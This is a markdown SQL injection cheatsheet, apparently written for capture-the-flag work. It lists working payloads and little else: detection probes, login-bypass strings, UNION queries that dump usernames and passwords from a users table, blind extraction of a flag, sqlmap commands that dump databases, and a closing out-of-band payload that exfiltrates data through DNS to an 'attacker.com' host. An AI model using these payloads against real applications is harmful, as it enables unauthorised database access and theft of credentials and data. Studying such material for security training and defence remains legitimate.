# SQLi Cheatsheet

## Detect (in order of cost)

1. **Error-based**: append `'` or `"` to a parameter. SQL error in response? → confirmed.
2. **Boolean**: `?id=1 AND 1=1` vs `?id=1 AND 1=2`. Different content? → blind boolean.
3. **Time-based**: `?id=1' AND SLEEP(5)--` → response delayed?
4. **UNION**: test column count: `' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--`, ...

## Quick wins

### Auth bypass

```sql
-- login forms
' OR '1'='1'-- -
admin' -- -
admin'/*
") OR 1=1-- -
```

### UNION data exfil

```sql
-- after finding column count N and one string-typed column
?id=-1' UNION SELECT NULL, table_name, NULL FROM information_schema.tables-- -
?id=-1' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -
?id=-1' UNION SELECT NULL, GROUP_CONCAT(username,0x7c,password), NULL FROM users-- -
```

### Blind boolean

```sql
?id=1 AND SUBSTRING((SELECT flag FROM flags),1,1)='a'
```
Automate character-by-character.

### Blind time

See `exploits/web/sqli_blind_time.py`.

## DBMS fingerprinting

- MySQL: `@@version`, `SLEEP(5)`, `CONCAT_WS`
- PostgreSQL: `version()`, `pg_sleep(5)`, `||`
- SQLite: `sqlite_version()`, quirky — no `SLEEP`
- MSSQL: `@@version`, `WAITFOR DELAY '0:0:5'`

## sqlmap automation

```bash
sqlmap -u 'http://host/page?id=1' --batch --level=3 --risk=2 --dbs
sqlmap -u '...' --data 'u=admin&p=x' --dump  # POST
sqlmap -u '...' --cookie 'sid=abc' --dbms mysql
```

## Second-order / stored SQLi

If inputs are sanitized at write but concatenated elsewhere (e.g., username stored then used in a later query), test values like `admin', (SELECT ...), '` that take effect on a secondary read.

## Out-of-band (OOB)

For databases with `LOAD_FILE` / `xp_dirtree` / DNS exfil: `?id=1 UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT flag FROM flags), '.attacker.com\\\\x'))`.
